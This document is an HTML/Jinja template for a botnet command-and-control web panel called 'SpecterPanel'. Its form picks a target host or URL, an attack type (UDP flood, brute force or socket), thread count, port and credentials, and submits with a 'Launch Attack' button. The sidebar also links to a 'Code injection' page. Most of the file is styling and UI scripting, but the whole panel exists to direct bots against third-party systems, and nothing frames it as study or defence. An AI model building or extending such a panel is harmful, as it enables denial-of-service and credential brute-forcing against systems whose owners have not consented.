{% extends 'view.html' %}

{% block style %}
<style>
    :root {
      --bg-dark: #121212;
      --bg-card: #1e1e1e;
      --bg-header: #222;
      --text-primary: #f0f0f0;
      --text-secondary: #ddd;
      --accent-color: #7bd389;
      --border-color: #333;
      --border-light: #444;
      --success-color: #4caf50;
      --warning-color: #ff9800;
      --error-color: #f44336;
      --info-color: #2196f3;
      --transition-speed: 0.25s;
      --shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      background-color: var(--bg-dark);
      color: var(--text-primary);
      font-family: 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
      line-height: 1.6;
      padding: 20px;
      min-height: 100vh;
    }

    .main-container {
      max-width: 1800px;
      margin: 0 auto;
      width: 100%;
    }

    .header {
      text-align: center;
      margin-bottom: 30px;
      padding-bottom: 15px;
      border-bottom: 1px solid var(--border-color);
    }

    .header h1 {
      color: var(--accent-color);
      margin-bottom: 10px;
      font-size: 2.5rem;
    }

    .header p {
      color: var(--text-secondary);
      font-size: 1.2rem;
    }

    .container {
      display: flex;
      gap: 40px;
      margin-bottom: 30px;
      flex-wrap: nowrap;
      height: 75vh;
      min-height: 600px;
    }

    .box {
      flex: 1;
      border-radius: 12px;
      background-color: var(--bg-card);
      box-shadow: var(--shadow);
      transition: transform var(--transition-speed) ease;
      overflow: hidden;
      display: flex;
      flex-direction: column;
    }

    .box:hover {
      transform: translateY(-5px);
    }

    .box h3 {
      margin: 0;
      padding: 20px;
      background: var(--bg-header);
      color: var(--accent-color);
      font-size: 1.4rem;
      display: flex;
      align-items: center;
      gap: 12px;
    }

    .box h3 i {
      font-size: 1.3rem;
    }

    .box-content {
      padding: 20px;
      flex: 1;
      display: flex;
      flex-direction: column;
      overflow: hidden;
    }

    /* Normal table styles */
    .data-table {
      width: 100%;
      border-collapse: collapse;
      margin-top: 0;
      flex: 1;
    }

    .data-table th {
      background-color: var(--bg-header);
      color: var(--accent-color);
      padding: 18px 16px;
      text-align: left;
      font-weight: 600;
      font-size: 1.1rem;
      position: sticky;
      top: 0;
      border-bottom: 2px solid var(--border-color);
    }

    .data-table td {
      padding: 16px;
      border-bottom: 1px solid var(--border-light);
      color: var(--text-secondary);
      font-size: 1.05rem;
    }

    .data-table tr:last-child td {
      border-bottom: none;
    }

    .data-table tr:hover td {
      background-color: rgba(255, 255, 255, 0.08);
      cursor: pointer;
    }

    /* Report table styles */
    .report-table {
      width: 100%;
      border-collapse: collapse;
      flex: 1;
    }

    .report-table tr {
      border-bottom: 1px solid var(--border-light);
    }

    .report-table tr:last-child {
      border-bottom: none;
    }

    .report-table td {
      padding: 20px 16px;
      vertical-align: top;
    }

    .report-table td.label {
      font-weight: 600;
      width: 30%;
      color: var(--accent-color);
      display: flex;
      align-items: center;
      gap: 12px;
      font-size: 1.1rem;
    }

    .report-table td.value {
      color: var(--text-secondary);
      font-size: 1.1rem;
    }

    /* Form Container Styles */
    .form-box {
      margin-top: 30px;
      border-radius: 12px;
      background-color: var(--bg-card);
      box-shadow: var(--shadow);
      overflow: hidden;
      animation: fadeIn 0.5s ease-out forwards;
      opacity: 0;
      display: none; /* Hidden by default */
    }

    .form-box.visible {
      display: block;
      animation: fadeIn 0.5s ease-out forwards;
    }

    .form-box h3 {
      margin: 0;
      padding: 20px;
      background: var(--bg-header);
      color: var(--accent-color);
      font-size: 1.4rem;
      display: flex;
      align-items: center;
      gap: 12px;
      position: relative;
    }

    .form-content {
      padding: 30px;
    }

    .form-row {
      display: flex;
      gap: 20px;
      margin-bottom: 20px;
    }

    .form-group {
      flex: 1;
      margin-bottom: 0;
    }

    .form-group.full-width {
      flex: 0 0 100%;
    }

    .form-label {
      display: block;
      margin-bottom: 8px;
      color: var(--text-primary);
      font-weight: 600;
      font-size: 1rem;
    }

    .form-input,
    .form-select,
    .form-textarea {
      width: 100%;
      padding: 12px 15px;
      background-color: var(--bg-dark);
      border: 1px solid var(--border-light);
      border-radius: 6px;
      color: var(--text-primary);
      font-size: 1rem;
      transition: all var(--transition-speed) ease;
    }

    .form-textarea {
      resize: vertical;
      min-height: 80px;
    }

    .form-input:focus,
    .form-select:focus,
    .form-textarea:focus {
      outline: none;
      border-color: var(--accent-color);
      box-shadow: 0 0 0 2px rgba(123, 211, 137, 0.2);
    }

    .form-input::placeholder {
      color: var(--text-secondary);
      opacity: 0.7;
    }

    .form-hint {
      font-size: 0.85rem;
      color: var(--text-secondary);
      margin-top: 5px;
      font-style: italic;
    }

    .conditional-field {
      display: none;
      animation: fadeIn 0.3s ease-out;
    }

    .conditional-field.visible {
      display: block;
    }

    /* Status badges */
    .status-badge {
      display: inline-block;
      padding: 8px 16px;
      border-radius: 16px;
      font-size: 0.9rem;
      font-weight: 600;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }

    .status-completed {
      background-color: rgba(76, 175, 80, 0.2);
      color: var(--success-color);
    }

    .status-pending {
      background-color: rgba(255, 152, 0, 0.2);
      color: var(--warning-color);
    }

    .status-error {
      background-color: rgba(244, 67, 54, 0.2);
      color: var(--error-color);
    }

    /* Action buttons */
    .action-buttons {
      display: flex;
      gap: 15px;
      margin-top: 25px;
      justify-content: flex-end;
      padding-top: 20px;
      border-top: 1px solid var(--border-light);
    }

    .form-buttons {
      display: flex;
      gap: 15px;
      justify-content: flex-end;
      margin-top: 30px;
      padding-top: 20px;
      border-top: 1px solid var(--border-light);
    }

    .btn {
      padding: 12px 24px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-weight: 600;
      font-size: 1rem;
      transition: all var(--transition-speed) ease;
      display: inline-flex;
      align-items: center;
      gap: 8px;
    }

    .btn-primary {
      background-color: var(--accent-color);
      color: #000;
    }

    .btn-secondary {
      background-color: var(--border-light);
      color: var(--text-primary);
    }

    .btn-danger {
      background-color: var(--error-color);
      color: white;
    }

    .btn-primary:hover {
      background-color: #66c77c;
      transform: translateY(-2px);
    }

    .btn-secondary:hover {
      background-color: #555;
      transform: translateY(-2px);
    }

    .btn-danger:hover {
      background-color: #d32f2f;
      transform: translateY(-2px);
    }

    .btn:disabled {
      opacity: 0.6;
      cursor: not-allowed;
      transform: none !important;
    }

    /* Close button for form */
    .form-close {
      position: absolute;
      top: 15px;
      right: 20px;
      background: none;
      border: none;
      color: var(--text-secondary);
      font-size: 1.5rem;
      cursor: pointer;
      transition: color var(--transition-speed) ease;
      padding: 5px;
      border-radius: 4px;
    }

    .form-close:hover {
      color: var(--error-color);
      background-color: rgba(244, 67, 54, 0.1);
    }

    /* Responsive design */
    @media (max-width: 1200px) {
      .container {
        flex-direction: column;
        height: auto;
      }
      
      .box {
        min-width: 100%;
      }
      
      .report-table td.label {
        width: 35%;
      }

      .form-row {
        flex-direction: column;
        gap: 0;
      }
    }

    /* Animations */
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(10px); }
      to { opacity: 1; transform: translateY(0); }
    }

    @keyframes fadeOut {
      from { opacity: 1; transform: translateY(0); }
      to { opacity: 0; transform: translateY(10px); }
    }

    .box {
      animation: fadeIn 0.5s ease-out forwards;
    }

    .box:nth-child(2) {
      animation-delay: 0.15s;
    }

    /* Tooltip */
    [data-tooltip] {
      position: relative;
      cursor: pointer;
    }

    [data-tooltip]:hover::after {
      content: attr(data-tooltip);
      position: absolute;
      bottom: 100%;
      left: 50%;
      transform: translateX(-50%);
      background: #333;
      color: #fff;
      padding: 8px 12px;
      border-radius: 6px;
      font-size: 0.9rem;
      white-space: nowrap;
      z-index: 10;
      margin-bottom: 8px;
    }

    /* Selected row styling */
    .data-table tr.selected {
      background-color: rgba(123, 211, 137, 0.15) !important;
      border-left: 4px solid var(--accent-color);
    }

    .data-table tr.selected td {
      color: var(--accent-color);
      font-weight: 500;
    }

    /* No selection message */
    .no-selection {
      text-align: center;
      color: var(--text-secondary);
      padding: 60px 20px;
      font-style: italic;
      font-size: 1.2rem;
      flex: 1;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
    }

    .no-selection i {
      font-size: 3rem;
      margin-bottom: 20px;
      opacity: 0.7;
    }

    /* Table container for scrolling */
    .table-container {
      flex: 1;
      overflow-y: auto;
      margin-top: 10px;
    }

    /* Wider columns for data table */
    .data-table th:nth-child(1),
    .data-table td:nth-child(1) {
      width: 30%;
    }

    .data-table th:nth-child(2),
    .data-table td:nth-child(2) {
      width: 15%;
    }

    .data-table th:nth-child(3),
    .data-table td:nth-child(3) {
      width: 30%;
    }

    .data-table th:nth-child(4),
    .data-table td:nth-child(4) {
      width: 25%;
    }

    /* Loading states */
    .loading {
      opacity: 0.6;
      pointer-events: none;
    }

    .spinner {
      border: 2px solid #f3f3f3;
      border-top: 2px solid var(--accent-color);
      border-radius: 50%;
      width: 20px;
      height: 20px;
      animation: spin 1s linear infinite;
      display: inline-block;
      margin-right: 10px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    /* Message styles */
    .error-message {
      background: var(--error-color);
      color: white;
      padding: 15px;
      border-radius: 6px;
      margin: 10px 0;
      display: flex;
      align-items: center;
      gap: 10px;
    }

    .success-message {
      background: var(--success-color);
      color: white;
      padding: 15px;
      border-radius: 6px;
      margin: 10px 0;
      display: flex;
      align-items: center;
      gap: 10px;
    }
</style>
{% endblock %}

{% block menus %}
<nav class="sidebar sidebar-offcanvas" id="sidebar">
	<div class="sidebar-brand-wrapper d-none d-lg-flex align-items-center justify-content-center fixed-top">
		<a class="sidebar-brand brand-logo" href="/dashboard">SpecterPanel</a>
		<a class="sidebar-brand brand-logo-mini" href="/dashboard">SP</a>
	</div>
	<ul class="nav">
		<li class="nav-item nav-category">
			<span class="nav-link">Menu Options</span>
		</li>
		<li class="nav-item menu-items">
			<a class="nav-link" href="/dashboard">
				<span class="menu-icon">
					<i class="mdi mdi-view-dashboard"></i>
				</span>
				<span class="menu-title">Dashboard</span>
			</a>
		</li>
		<li class="nav-item menu-items">
			<a class="nav-link" href="/api_link">
				<span class="menu-icon">
					<i class="mdi mdi-robot"></i>
				</span>
				<span class="menu-title">BotNet</span>
			</a>
		</li>
		<li class="nav-item menu-items">
			<a class="nav-link" href="/code">
				<span class="menu-icon">
					<i class="mdi mdi-needle"></i>
				</span>
				<span class="menu-title">Code injection</span>
			</a>
		</li>
		<li class="nav-item menu-items">
			<a class="nav-link" href="/settings">
				<span class="menu-icon">
					<i class="mdi mdi-settings"></i>
				</span>
				<span class="menu-title">settings</span>
			</a>
		</li>
	</ul>
</nav>
{% endblock %}

{% block title %}Socket Status{% endblock %}

{% block body %}
<div class="main-container">
    <header class="header">
      <h1><i class="fas fa-table"></i> BotNet Control panel</h1>
      <p>View and manage your data records - Click any row to view details</p>
    </header>

    <div class="container">
      <!-- Left Div - Data Table -->
      <div class="box">
        <h3><i class="fas fa-users"></i> User Records</h3>
        <div class="box-content">
          <div class="table-container">
            <table class="data-table" aria-label="User data table">
              <thead>
                <tr>
                  <th>Target Name</th>
                  <th>BotNet Type</th>
                  <th>Link/Host</th>
                  <th>Actions</th>
                </tr>
              </thead>
              <tbody>
                <!-- links -->
                {% for link in links %}
                  <tr data-id="{{ link.ID }}">
                    <td>{{ link.target_name }}</td>
                    <td>{{ link.action_type }}</td>
                    <td>{{ link.link }}</td>
                    <td><h4><a href="api_link_delete/{{ link.ID }}" class="btn btn-danger delete-link">Delete</a></h4></td>
                  </tr>
                {% endfor %}
              </tbody>
            </table>
          </div>

          <div class="action-buttons">
            <button class="btn btn-secondary" id="export-btn" aria-label="Export user data">
              <i class="fas fa-download"></i> Export
            </button>
            <button class="btn btn-primary" id="add-user-btn" aria-label="Add new user">
              <i class="fas fa-plus"></i> Add User
            </button>
          </div>
        </div>
      </div>

      <!-- Right Div - Report Table -->
      <div class="box">
        <h3><i class="fas fa-file-alt"></i> Selected BotNet Details</h3>
        <div class="box-content">
          <div id="no-selection" class="no-selection">
            <i class="fas fa-mouse-pointer"></i>
            <p>Click on a user record to view details</p>
          </div>
          <div id="report-container" style="display: none; flex: 1; overflow-y: auto;">
            <table id="report-table" class="report-table" aria-label="Report details">
              <tr>
                <td class="label">
                  <i class="fas fa-user"></i> Target Name
                </td>
                <td id="report-name" class="value"></td>
              </tr>
              <tr>
                <td class="label">
                  <i class="fas fa-birthday-cake"></i> BotNet Type
                </td>
                <td id="report-type" class="value"></td>
              </tr>
              <tr>
                <td class="label">
                  <i class="fas fa-building"></i> Link/Host
                </td>
                <td id="report-link" class="value"></td>
              </tr>
              <tr>
                <td class="label">
                  <i class="fas fa-check-circle"></i> Status
                </td>
                <td id="report-status" class="value"></td>
              </tr>
              <tr>
                <td class="label">
                  <i class="fas fa-id-card"></i> Number of Threads(for udp-flood and bruteForce)
                </td>
                <td id="report-threads" class="value"></td>
              </tr>
              <tr>
                <td class="label">
                  <i class="fas fa-envelope"></i> Port Number(Only for Socket)
                </td>
                <td id="report-port" class="value"></td>
              </tr>
              <tr>
                <td class="label">
                  <i class="fas fa-phone"></i> User Name(input name for bruteForce)
                </td>
                <td id="report-username" class="value"></td>
              </tr>
              <tr>
                <td class="label">
                  <i class="fas fa-map-marker-alt"></i> Password(input name for bruteForce)
                </td>
                <td id="report-password" class="value"></td>
              </tr>
            </table>

            <div class="action-buttons">
              <button class="btn btn-secondary" aria-label="Print report">
                <i class="fas fa-print"></i> Print
              </button>
              <button class="btn btn-primary" aria-label="View full report">
                <i class="fas fa-external-link-alt"></i> View Full
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>

    <!-- Add New BotNet Command Form - Completely separate from the boxes above -->
    <div class="form-box" id="botnet-form-container">
      <h3>
        <i class="fas fa-plus-circle"></i> Add New BotNet Command
        <button class="form-close" id="close-form-btn" aria-label="Close form">
          <i class="fas fa-times"></i>
        </button>
      </h3>
      <div class="form-content">
        <form id="botnet-form" action="/api_link" method="POST">
          <div class="form-row">
            <div class="form-group">
              <label for="target_name" class="form-label">Target Name *</label>
              <select id="target_name" name="target_name" class="form-select" required>
                <option value="">Select Target</option>
                {% for target in targets %}
                  <option value="{{ target }}">{{ target }}</option>
                {% endfor %}
              </select>
            </div>

            <div class="form-group">
              <label for="action_type" class="form-label">BotNet Type *</label>
              <select id="action_type" name="type" class="form-select" required>
                <option value="">Select attack type</option>
                <option value="udp-flood">UDP Flood</option>
                <option value="bruteForce">Brute Force</option>
                <option value="socket">Socket</option>
              </select>
            </div>
          </div>

          <div class="form-group">
            <label for="link" class="form-label">Target Link/Host *</label>
            <input type="text" id="link" name="link" class="form-input" required 
                   placeholder="Enter target URL or IP address">
            <div class="form-hint">Example: 192.168.1.1 or https://example.com</div>
          </div>

          <!-- Conditional Fields based on BotNet Type -->
          <div class="form-row">
            <div class="form-group">
              <label for="threads" class="form-label">Number of Threads</label>
              <input type="number" id="threads" name="threads" class="form-input" 
                     min="1" max="1000" value="0"
                     placeholder="Number of concurrent threads">
              <div class="form-hint">Used for UDP Flood and Brute Force attacks</div>
            </div>

            <div class="form-group" id="port-field">
              <label for="port" class="form-label">Port Number</label>
              <input type="number" id="port" name="port" class="form-input" 
                     min="1" max="65535" placeholder="Target port">
              <div class="form-hint">Required for Socket-based attacks</div>
            </div>
          </div>

          <div class="form-row" id="bruteforce-fields">
            <div class="form-group">
              <label for="username" class="form-label">Username</label>
              <input type="text" id="username" name="username" class="form-input" 
                     placeholder="Username for brute force">
            </div>

            <div class="form-group">
              <label for="password" class="form-label">Password</label>
              <input type="password" id="password" name="password" class="form-input" 
                     placeholder="Password for brute force">
            </div>
          </div>

          <div class="form-buttons">
            <button type="reset" class="btn btn-secondary" id="reset-form-btn">
              <i class="fas fa-undo"></i> Clear Form
            </button>
            <button type="submit" class="btn btn-primary" id="submit-btn">
              <i class="fas fa-rocket"></i> Launch Attack
            </button>
          </div>
        </form>
      </div>
    </div>
</div>
{% endblock %}

{% block script %}
<script>
    document.addEventListener('DOMContentLoaded', function() {
      // Sample user data with additional fields
      const userData = {
       {% for report in reports %}
        "{{ report[0] }}": {
          name: "{{ report[2] }}",
          type: "{{ report[4] }}",
          link: "{{ report[3] }}",
          status: "{{ report[5] if report[6] else 'Pending' }}",
          threads: "{{ report[7] if report[7] else 'N/A' }}",
          port: "{{ report[6] if report[6] else 'N/A' }}",
          username: "{{ report[9] if report[9] else 'N/A' }}",
          password: "{{ report[8] if report[10] else 'N/A' }}",
        },
       {% endfor %}
      };

      // Get DOM elements
      const dataRows = document.querySelectorAll('.data-table tbody tr');
      const reportContainer = document.getElementById('report-container');
      const noSelection = document.getElementById('no-selection');
      const formContainer = document.getElementById('botnet-form-container');
      const addUserBtn = document.getElementById('add-user-btn');
      const closeFormBtn = document.getElementById('close-form-btn');
      const resetFormBtn = document.getElementById('reset-form-btn');
      
      // Report table fields
      const reportName = document.getElementById('report-name');
      const reportType = document.getElementById('report-type');
      const reportDepartment = document.getElementById('report-link');
      const reportStatus = document.getElementById('report-status');
      const reportId = document.getElementById('report-threads');
      console.log(reportId);
      const reportEmail = document.getElementById('report-port');
      const reportPhone = document.getElementById('report-username');
      const reportLocation = document.getElementById('report-password');
      
      // Form elements
      const actionTypeSelect = document.getElementById('action_type');
      const portField = document.getElementById('port-field');
      const bruteForceFields = document.getElementById('bruteforce-fields');
      const botnetForm = document.getElementById('botnet-form');
      const submitBtn = document.getElementById('submit-btn');
      
      // Initialize conditional fields
      initializeConditionalFields();
      
      // Show form when "Add User" button is clicked
      addUserBtn.addEventListener('click', function() {
        showForm();
      });
      
      // Close form when close button is clicked
      closeFormBtn.addEventListener('click', function() {
        hideForm();
      });
      
      // Close form when clicking outside the form
      document.addEventListener('click', function(e) {
        if (formContainer.classList.contains('visible') && 
            !formContainer.contains(e.target) && 
            e.target !== addUserBtn) {
          hideForm();
        }
      });
      
      // Reset form and hide it
      resetFormBtn.addEventListener('click', function() {
        setTimeout(() => {
          initializeConditionalFields();
        }, 100);
      });
      
      // Add click handler to table rows
      dataRows.forEach(row => {
        row.addEventListener('click', function() {
          // Remove selected class from all rows
          dataRows.forEach(r => r.classList.remove('selected'));
          
          // Add selected class to clicked row
          this.classList.add('selected');
          
          // Get user ID from data attribute
          const userId = this.getAttribute('data-id');
          const user = userData[userId];
          
          if (user) {
            // Update report table with selected user data
            reportName.textContent = user.name;
            reportType.textContent = user.type;
            reportDepartment.textContent = user.link;
            reportId.textContent = user.threads;
            reportEmail.textContent = user.port;
            reportPhone.textContent = user.username;
            reportLocation.textContent = user.password;
            
            // Update status with appropriate badge
            reportStatus.innerHTML = '';
            let statusBadge = document.createElement('span');
            statusBadge.classList.add('status-badge');
            
            if (user.status === 'Active' || user.status === 'Completed') {
              statusBadge.classList.add('status-completed');
            } else if (user.status === 'Pending') {
              statusBadge.classList.add('status-pending');
            } else {
              statusBadge.classList.add('status-error');
            }
            
            statusBadge.textContent = user.status;
            reportStatus.appendChild(statusBadge);
            
            // Show report table and hide no selection message
            reportContainer.style.display = 'block';
            noSelection.style.display = 'none';
          }
        });
        
        // Make rows keyboard accessible
        row.setAttribute('tabindex', '0');
        row.addEventListener('keydown', function(e) {
          if (e.key === 'Enter' || e.key === ' ') {
            this.click();
            e.preventDefault();
          }
        });
      });
      
      // Handle BotNet type changes to show/hide conditional fields
      actionTypeSelect.addEventListener('change', function() {
        updateConditionalFields(this.value);
      });
      
      // Form submission handler
      botnetForm.addEventListener('submit', function(e) {
        e.preventDefault();
        
        if (!validateForm()) {
          return;
        }
        
        // Show loading state
        submitBtn.disabled = true;
        submitBtn.innerHTML = '<div class="spinner"></div> Launching...';
        
        // Collect form data
        const formData = new FormData(this);
        const formDataObj = Object.fromEntries(formData);
        
        // Simulate API call (replace with actual fetch)
        setTimeout(() => {
          console.log('Form submitted with data:', formDataObj);
          
          // Show success message
          showMessage('BotNet command launched successfully!', 'success');
          
          // Reset form and button
          submitBtn.disabled = false;
          submitBtn.innerHTML = '<i class="fas fa-rocket"></i> Launch Attack';
          
          // Optional: Hide form after successful submission
          setTimeout(() => {
            hideForm();
            botnetForm.reset();
            initializeConditionalFields();
          }, 2000);
          
          // In a real application, you would submit the form or use fetch
          this.submit(); // Uncomment to actually submit the form
        }, 2000);
      });
      
      // Export functionality
      document.getElementById('export-btn').addEventListener('click', function() {
        exportToCSV();
      });
      
      // Utility functions
      function showForm() {
        formContainer.classList.add('visible');
        formContainer.scrollIntoView({ 
          behavior: 'smooth',
          block: 'start'
        });
      }
      
      function hideForm() {
        formContainer.classList.remove('visible');
        // Reset form when hiding
        setTimeout(() => {
          botnetForm.reset();
          initializeConditionalFields();
        }, 300);
      }
      
      function initializeConditionalFields() {
        // Hide all conditional fields initially
        portField.style.display = 'none';
        bruteForceFields.style.display = 'none';
        
        // Set initial requirements
        document.getElementById('port').required = false;
        document.getElementById('username').required = false;
        document.getElementById('password').required = false;
      }
      
      function updateConditionalFields(selectedType) {
        // Reset all conditional fields
        portField.style.display = 'none';
        bruteForceFields.style.display = 'none';
        
        // Reset requirements
        document.getElementById('port').required = false;
        document.getElementById('username').required = false;
        document.getElementById('password').required = false;
        
        // Show fields based on selected type
        if (selectedType === 'socket') {
          portField.style.display = 'block';
          document.getElementById('port').required = true;
        }
        
        if (selectedType === 'bruteForce') {
          bruteForceFields.style.display = 'flex';
          document.getElementById('username').required = true;
          document.getElementById('password').required = true;
        }
      }
      
      function validateForm() {
        const targetName = document.getElementById('target_name').value.trim();
        const actionType = document.getElementById('action_type').value;
        const link = document.getElementById('link').value.trim();
        
        if (!targetName) {
          showMessage('Please enter a target name', 'error');
          return false;
        }
        
        if (!actionType) {
          showMessage('Please select a BotNet type', 'error');
          return false;
        }
        
        if (!link) {
          showMessage('Please enter a target link/host', 'error');
          return false;
        }
        
        // Additional validation based on attack type
        if (actionType === 'socket') {
          const port = document.getElementById('port').value;
          if (!port || port < 1 || port > 65535) {
            showMessage('Please enter a valid port number (1-65535)', 'error');
            return false;
          }
        }
        
        if (actionType === 'bruteForce') {
          const username = document.getElementById('username').value.trim();
          const password = document.getElementById('password').value;
          if (!username || !password) {
            showMessage('Please enter both username and password for brute force attack', 'error');
            return false;
          }
        }
        
        return true;
      }
      
      function exportToCSV() {
        const rows = [];
        // Add headers
        rows.push(['Target Name', 'BotNet Type', 'Link/Host', 'Status']);
        
        // Add data
        dataRows.forEach(row => {
          const cells = row.querySelectorAll('td');
          const rowData = Array.from(cells).map(cell => cell.textContent);
          rows.push(rowData);
        });
        
        // Convert to CSV and download
        const csvContent = rows.map(row => row.join(',')).join('\n');
        const blob = new Blob([csvContent], { type: 'text/csv' });
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = 'botnet_commands.csv';
        a.click();
        window.URL.revokeObjectURL(url);
        
        showMessage('Data exported successfully!', 'success');
      }
      
      function showMessage(message, type) {
        const messageDiv = document.createElement('div');
        messageDiv.className = type === 'success' ? 'success-message' : 'error-message';
        messageDiv.innerHTML = `
          <i class="fas ${type === 'success' ? 'fa-check-circle' : 'fa-exclamation-triangle'}"></i>
          <span>${message}</span>
        `;
        
        // Insert message before the form
        document.querySelector('.form-content').insertBefore(messageDiv, botnetForm);
        
        // Remove message after 5 seconds
        setTimeout(() => {
          if (messageDiv.parentNode) {
            messageDiv.parentNode.removeChild(messageDiv);
          }
        }, 5000);
      }
      
      // Add ripple effect to buttons
      const buttons = document.querySelectorAll('.btn');
      buttons.forEach(btn => {
        btn.addEventListener('click', function(e) {
          // Add ripple effect
          const ripple = document.createElement('span');
          ripple.classList.add('ripple');
          this.appendChild(ripple);
          
          // Remove ripple after animation
          setTimeout(() => {
            ripple.remove();
          }, 600);
        });
      });
    });
</script>
{% endblock %}